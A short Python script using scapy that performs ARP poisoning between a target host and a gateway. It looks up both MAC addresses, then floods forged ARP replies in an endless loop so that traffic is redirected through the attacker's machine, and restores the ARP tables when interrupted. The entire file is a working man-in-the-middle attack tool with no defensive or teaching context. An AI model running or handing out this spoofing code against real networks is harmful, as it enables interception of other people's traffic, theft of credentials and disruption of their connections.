import scapy.all as scapy
from optparse import OptionParser
import time

def inputs():
    value = OptionParser()
    value.add_option("-t","--target",dest="target",help="This is your attack IP")
    value.add_option("-r","--range",dest="range",help="This is your range IP")
    key = value.parse_args()[0]
    if key.target and key.range:
        return key
    else:
        print("You have to enter an IP or range IP")

def get_mac(IP):
    ip_packet = scapy.ARP(pdst=IP)
    mac_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packets = mac_packet/ip_packet
    answer = scapy.srp(combined_packets,timeout=1,verbose=False)[0]
    return answer[0][1].hwsrc # ["8","0".."0","1"] şeklinde yazamamsı için liste içinden çıkardım.



def arp_poison(target,range):
    target_mac = get_mac(target)
    range_mac = get_mac(range)

    poison_target_packet = scapy.ARP(pdst=target,hwdst=target_mac,psrc=range)
    poison_range_packet =  scapy.ARP(pdst=range,hwdst=range_mac,psrc=target)

    scapy.send(poison_range_packet,verbose=False)
    scapy.send(poison_target_packet,verbose=False)

def unarp_poison(target,range):
    target_mac = get_mac(target)
    range_mac = get_mac(range)

    unpoison_target_packet = scapy.ARP(pdst=target,hwdst=target_mac,hwsrc=range_mac,psrc=range)
    unpoison_range_packet = scapy.ARP(pdst=range,hwdst=range_mac,hwsrc=target_mac,psrc=target)

    scapy.send(unpoison_range_packet,verbose=False)
    scapy.send(unpoison_target_packet,verbose=False)

key = inputs()
number = 0

try:
    while True:
        arp_poison(key.target,key.range)
        time.sleep(1)
        number +=2
        print(f"\rPackets sending: {number} ",end="")

except:
    print("\nOkay, see you later!")
    unarp_poison(key.target,key.range)